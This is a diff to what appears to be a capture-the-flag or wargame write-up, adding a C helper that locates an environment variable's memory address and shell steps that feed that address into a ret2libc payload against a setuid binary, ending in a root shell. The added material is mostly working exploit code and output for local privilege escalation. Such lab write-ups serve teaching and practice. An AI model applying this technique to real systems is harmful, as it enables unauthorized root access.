@@ -28,9 +28,35 @@ $ echo $SHELL
 /bin/sh
 ```
 
+Conveniently, the vim buffer in the `zaz` user's home has some code left over we can just.. paste!
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+    char *ptr;
+    if (argc < 3) {
+        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+        exit(0);
+    }
+    ptr = getenv(argv[1]); /* Get env var location. */
+    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+    printf("%s will be at %p\n", argv[1], ptr);
+}
+```
+
+Superb! Delicously simple. We can now update our payload with the address of the environment variable, and we're good to go!
+```bash
+$ export SHELL=/bin/dash
+$ cc env.c -o env
+$ ./env SHELL ./exploit_me
+SHELL will be at 0xbffff927
+```
+
 Neat! Everything we need is already in memory, we just need to get our payload into an executable position via some ridiculously crafted offset aaaaanddddd:
 ```bash
-$ SHELL=/bin/dash ./exploit_me $(echo -en $(python2 payload-ret2libc.py))
+$ ./exploit_me $(echo -en $(python2 payload-ret2libc.py 0xbffff927))
 ...
 # id
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
